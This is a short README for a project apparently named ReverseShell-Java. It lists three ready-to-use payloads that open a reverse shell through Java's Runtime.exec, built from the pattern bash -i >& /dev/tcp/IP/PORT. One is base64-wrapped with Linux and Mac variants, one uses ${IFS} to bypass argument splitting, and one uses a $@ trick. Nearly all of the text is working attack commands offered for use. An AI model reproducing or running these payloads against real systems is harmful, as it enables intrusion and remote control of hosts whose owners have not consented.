# ReverseShell-Java
The project work on generating payloads to reverse shell in different contexts of java.


### Payloads in Runtime.getRuntime().exec(String command):
#### Method1:
Linux: bash -c {echo,**BASE64(bash -i >& /dev/tcp/IP/PORT 0>&1)**}|{base64,-d}|{bash,-i}

MAC: bash -c {echo,**BASE64(bash -i >& /dev/tcp/IP/PORT 0>&1)**}|{base64,-D}|{bash,-i}
#### Method2:
bash -c bash${IFS}-i${IFS}>&/dev/tcp/**IP**/**PORT**<&1
#### Method3:
bash -c $@|bash 0 echo bash -i >& /dev/tcp/**IP**/**PORT** 0>&1

### Reference:
http://www.jackson-t.ca/runtime-exec-payloads.html

https://blog.spoock.com/2018/11/25/getshell-bypass-exec/
